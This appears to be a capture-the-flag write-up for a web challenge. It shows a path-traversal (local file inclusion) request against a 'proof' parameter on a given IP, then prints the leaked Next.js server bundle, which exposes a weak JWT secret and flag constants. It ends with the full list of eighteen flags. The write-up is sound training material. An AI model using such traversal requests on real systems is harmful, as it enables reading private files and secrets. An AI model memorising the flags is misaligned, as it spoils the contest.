# Web chal

## Description

web chal

## Solution Walkthrough

I noticed that the proof field was vulnerable to LFI (this has been patched by the admin now).

`http://159.89.237.133/api/reviews/proof?proof=../../../../app/.next/server/app/api/auth/complete/route.js`

```js
(()=>{var e={};e.id=2310,e.ids=[2310],e.modules={3295:e=>{"use strict";e.exports=require("next/dist/server/app-render/after-task-async-storage.external.js")},7376:(e,r,t)=>{"use strict";t.r(r),t.d(r,{patchFetch:()=>f,routeModule:()=>l,serverHooks:()=>A,workAsyncStorage:()=>p,workUnitAsyncStorage:()=>d});var n={};t.r(n),t.d(n,{GET:()=>_});var s=t(52334),i=t(51015),u=t(29694),o=t(71343),a=t(82981),c=t(71862);async function _(e){if(!(await (0,a.Ht)()).isAuthenticated)return o.NextResponse.redirect(new URL("/auth",e.url));let r=e.nextUrl.searchParams.get("next");if(!r)return o.NextResponse.redirect(new URL("/dashboard",e.url));let t=r.includes("?")?"&":"?";return o.NextResponse.redirect(`${r}${t}handoff=${encodeURIComponent(c.M.A14)}`)}let l=new s.AppRouteRouteModule({definition:{kind:i.RouteKind.APP_ROUTE,page:"/api/auth/complete/route",pathname:"/api/auth/complete",filename:"route",bundlePath:"app/api/auth/complete/route"},resolvedPagePath:"/app/src/app/api/auth/complete/route.ts",nextConfigOutput:"standalone",userland:n}),{workAsyncStorage:p,workUnitAsyncStorage:d,serverHooks:A}=l;function f(){return(0,u.patchFetch)({workAsyncStorage:p,workUnitAsyncStorage:d})}},10846:e=>{"use strict";e.exports=require("next/dist/compiled/next-server/app-page.runtime.prod.js")},27910:e=>{"use strict";e.exports=require("stream")},28354:e=>{"use strict";e.exports=require("util")},29294:e=>{"use strict";e.exports=require("next/dist/server/app-render/work-async-storage.external.js")},43696:()=>{},44870:e=>{"use strict";e.exports=require("next/dist/compiled/next-server/app-route.runtime.prod.js")},53424:()=>{},55511:e=>{"use strict";e.exports=require("crypto")},63033:e=>{"use strict";e.exports=require("next/dist/server/app-render/work-unit-async-storage.external.js")},66609:(e,r,t)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0}),Object.defineProperty(r,"createDedupedByCallsiteServerErrorLoggerDev",{enumerable:!0,get:function(){return a}});let n=function(e,r){if(e&&e.__esModule)return e;if(null===e||"object"!=typeof e&&"function"!=typeof e)return{default:e};var t=s(r);if(t&&t.has(e))return t.get(e);var n={__proto__:null},i=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var u in e)if("default"!==u&&Object.prototype.hasOwnProperty.call(e,u)){var o=i?Object.getOwnPropertyDescriptor(e,u):null;o&&(o.get||o.set)?Object.defineProperty(n,u,o):n[u]=e[u]}return n.default=e,t&&t.set(e,n),n}(t(69553));function s(e){if("function"!=typeof WeakMap)return null;var r=new WeakMap,t=new WeakMap;return(s=function(e){return e?t:r})(e)}let i={current:null},u="function"==typeof n.cache?n.cache:e=>e,o=console.warn;function a(e){return function(...r){o(e(...r))}}u(e=>{try{o(i.current)}finally{i.current=null}})},71862:(e,r,t)=>{"use strict";t.d(r,{M:()=>n});let n={A01:process.env.RIFFHACK_A01_FLAG||"bitflag{jwt_5h4ll_n0t_p455}",A02:process.env.RIFFHACK_A02_FLAG||"bitflag{md5_1s_br0k3n_l1k3_my_h34rt}",A03:process.env.RIFFHACK_A03_FLAG||"bitflag{0c34n5_11_c0up0n_h31st}",A04:process.env.RIFFHACK_A04_FLAG||"bitflag{c0up0n_st4ck1ng_1s_4_d34l}",A05:process.env.RIFFHACK_A05_FLAG||"bitflag{d3bug_m0d3_1s_d4ng3r0us}",A06:process.env.RIFFHACK_A06_FLAG||"bitflag{pr0t0typ3_p0llut10n_1s_1n_th3_3nv1r0nm3nt}",A07:process.env.RIFFHACK_A07_FLAG||"bitflag{m1ddl3w4r3_byp455_1s_4_thr34t}",A08:process.env.RIFFHACK_A08_FLAG||"bitflag{1d0r_1s_4_d4ng3r0us_g4m3}",A09:process.env.RIFFHACK_A09_FLAG||"bitflag{csrf_1s_4_sl33py_thr34t}",A10:process.env.RIFFHACK_A10_FLAG||"bitflag{ssrf_1s_4_p4rty_cr4sh3r}",A11:process.env.RIFFHACK_A11_FLAG||"bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}",A12:process.env.RIFFHACK_A12_FLAG||"bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}",A13:process.env.RIFFHACK_A13_FLAG||"bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}",A14:process.env.RIFFHACK_A14_FLAG||"bitflag{tru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts}",A15:process.env.RIFFHACK_A15_FLAG||"bitflag{n0t35_4r3_c0nt3nt_t00}",A16:process.env.RIFFHACK_A16_FLAG||"bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks}",A17:process.env.RIFFHACK_A17_FLAG||"bitflag{r0b0ts_4r3_n0t_4_s3cr3t_v4ult}",A18:process.env.RIFFHACK_A18_FLAG||"bitflag{1nj3ct10n_turn5_4_l00kup_1nt0_4_l34k}"}},79428:e=>{"use strict";e.exports=require("buffer")},82981:(e,r,t)=>{"use strict";t.d(r,{Ht:()=>i,On:()=>o});var n=t(95428),s=t(86020);async function i(){try{let e=await (0,n.UL)(),r=e.get("auth-token")?.value;if(!r)return{user:null,isAuthenticated:!1};let t=(0,s.n)(r);if(!t)return{user:null,isAuthenticated:!1};return{user:{id:t.id,email:t.email,isVendor:t.isVendor??!1,vendorName:t.vendorName},isAuthenticated:!0}}catch(e){return console.error("Session error:",e),{user:null,isAuthenticated:!1}}}async function u(){let e=await i();if(!e.isAuthenticated)throw Error("Authentication required");return e}async function o(){let e=await u();if(!e.user?.isVendor)throw Error("Vendor access required");return e}},86020:(e,r,t)=>{"use strict";t.d(r,{H:()=>i,n:()=>u});var n=t(70835),s=t.n(n);function i(e){return s().sign(e,"weak-secret-key-for-demo",{expiresIn:"7d"})}function u(e){try{let r=s().decode(e);if(!r||!r.id||!r.email)return null;return{id:r.id,email:r.email,isVendor:r.isVendor||!1,vendorName:r.vendorName}}catch(e){return console.error("JWT verification error:",e),null}}}};var r=require("../../../../webpack-runtime.js");r.C(e);var t=e=>r(r.s=e),n=r.X(0,[8687,4700,835,5428],()=>t(7376));module.exports=n})();
```

After accessing it, I obtained all the web flags.

```json
{
  "A01": "bitflag{jwt_5h4ll_n0t_p455}",
  "A02": "bitflag{md5_1s_br0k3n_l1k3_my_h34rt}",
  "A03": "bitflag{0c34n5_11_c0up0n_h31st}",
  "A04": "bitflag{c0up0n_st4ck1ng_1s_4_d34l}",
  "A05": "bitflag{d3bug_m0d3_1s_d4ng3r0us}",
  "A06": "bitflag{pr0t0typ3_p0llut10n_1s_1n_th3_3nv1r0nm3nt}",
  "A07": "bitflag{m1ddl3w4r3_byp455_1s_4_thr34t}",
  "A08": "bitflag{1d0r_1s_4_d4ng3r0us_g4m3}",
  "A09": "bitflag{csrf_1s_4_sl33py_thr34t}",
  "A10": "bitflag{ssrf_1s_4_p4rty_cr4sh3r}",
  "A11": "bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}",
  "A12": "bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}",
  "A13": "bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}",
  "A14": "bitflag{tru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts}",
  "A15": "bitflag{n0t35_4r3_c0nt3nt_t00}",
  "A16": "bitflag{3xp0rts_sh0uld_n0t_b3_0p3n_b00ks}",
  "A17": "bitflag{r0b0ts_4r3_n0t_4_s3cr3t_v4ult}",
  "A18": "bitflag{1nj3ct10n_turn5_4_l00kup_1nt0_4_l34k}"
}
```

## Flag

```text
bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}
```
